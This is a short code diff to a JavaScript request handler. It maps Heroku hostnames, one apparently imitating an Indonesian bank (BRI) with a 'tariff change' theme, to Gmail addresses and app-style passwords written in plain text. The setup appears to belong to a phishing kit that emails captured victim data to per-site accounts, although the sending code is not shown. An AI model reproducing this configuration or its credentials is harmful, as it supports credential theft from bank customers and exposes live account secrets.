@@ -21,9 +21,9 @@ export default function handler(req, res) {
         email = 'pukiayam5123@gmail.com';
         pass = 'joyxbannkfmypmzx';
 
-    } else if(url == 'bri.herokuapp.com'){
-        email = 'penaruhangin@gmail.com';
-        pass = 'alocfzvnbofojokm';
+    } else if(url == 'bri-perubahantarif.herokuapp.com'){
+        email = 'pooopss117@gmail.com';
+        pass = 'nkcgdjrpogrmqprm';
 
     }
     else {
